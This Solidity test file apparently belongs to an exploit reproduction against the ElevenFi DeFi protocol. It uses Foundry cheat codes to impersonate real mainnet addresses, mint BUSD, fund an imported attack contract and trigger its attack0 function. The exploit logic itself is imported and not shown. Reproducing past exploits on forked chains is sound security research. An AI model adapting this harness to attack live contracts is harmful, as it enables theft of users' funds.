// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;

import "ds-test/test.sol";
import "../attack.sol";
import "../stdlib.sol";
import "../Vm.sol";
import "../CheatCodes.sol";


contract attackTester is DSTest, stdCheats {
    ElevenFi_attack attackContract;
    Vm public constant vm = Vm(HEVM_ADDRESS);
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);

    constructor() {
        startHoax(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58), 90000000000 ether);
        attackContract = new ElevenFi_attack();
        cheats.stopPrank();
        IBUSD BUSD = IBUSD(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
        cheats.prank(0xD2f93484f2D319194cBa95C5171B18C1d8cfD6C4);
        BUSD.mint(130001e18);
        cheats.prank(0xD2f93484f2D319194cBa95C5171B18C1d8cfD6C4);
        BUSD.transfer(address(attackContract), 130001e18);
        cheats.stopPrank();
    }

    
    function testExample0_() public {
      attackContract.attack0(130001,130947,130947,261894);
    }

}